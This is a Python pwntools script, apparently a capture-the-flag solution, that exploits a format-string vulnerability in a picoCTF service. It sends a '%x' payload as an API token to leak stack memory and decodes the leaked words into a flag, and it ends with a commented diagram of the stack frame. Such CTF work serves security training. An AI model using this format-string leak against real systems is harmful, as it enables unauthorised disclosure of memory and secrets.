from pwn import *

# string to write to
s = ""

# open up remote connection
r = remote('mercury.picoctf.net', 53437)

# get to vulnerability
r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

# send string to print stack
r.send("%x" + "-%x"*100 + "\n")

# receive until the line we want
r.recvline()

# read in line
x = r.recvline()

print(x)
# remove unwanted components
x = x[:-1].decode()

print(x)

# parse to characters
for i in x.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

# print string
print(s)





#            ┌──────────────────────────┐  ← High addresses (older frames)
#            │ … return into main() …   │
#            ├──────────────────────────┤
# [ RBP + 8 ]│ ▶ Return address         │  
# [ RBP     ]│ ▶ Saved RBP of buy_stonks│  
#            ├──────────────────────────┤
#            │ ▶ (padding / alignment)  │  
#            ├──────────────────────────┤
#            │ ▶ Pointer user_buf       │  ← local variable (8 bytes)
#            ├──────────────────────────┤
#            │ ▶ Pointer temp           │  ← local Stonk* (8 bytes)
#            ├──────────────────────────┤
#            │ ▶ int shares             │  ← (4 bytes)
#            ├──────────────────────────┤
#            │ ▶ int money              │  ← (4 bytes)
#            ├──────────────────────────┤
#            │ ▶ FILE *f                 │  ← (8 bytes)
#            ├──────────────────────────┤
# [ RBP - 136]│ ▶ (more padding)         │  
#            ├──────────────────────────┤
# [ RBP - 264]│ ▶ api_buf[128]           │  ← buffer holding the “API token” read by fgets
#            ├──────────────────────────┤
#            │ … lower addresses …      │
#            └──────────────────────────┘  ← Low addresses (newer allocations)
